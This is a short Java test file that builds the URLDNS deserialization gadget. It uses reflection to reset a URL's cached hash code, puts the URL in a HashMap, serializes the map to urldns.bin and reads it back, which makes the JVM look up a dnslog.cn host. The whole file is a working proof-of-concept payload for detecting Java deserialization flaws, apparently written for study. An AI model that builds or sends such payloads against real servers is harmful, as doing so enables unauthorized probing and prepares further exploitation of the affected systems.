package test;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class DNSTest {
    public static void main(String[] args) throws Exception {

//        URL url1 = new URL("http://hw54so.dnslog.cn");
//        url1.hashCode();


        HashMap  hashMap = new HashMap<>();
        URL  url  = new URL("http://8de0ko.dnslog.cn");
        Field f  = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 0x01010101);
        hashMap.put(url, 0);
        f.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
        oos.writeObject(hashMap);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.bin"));
        ois.readObject();
    }
}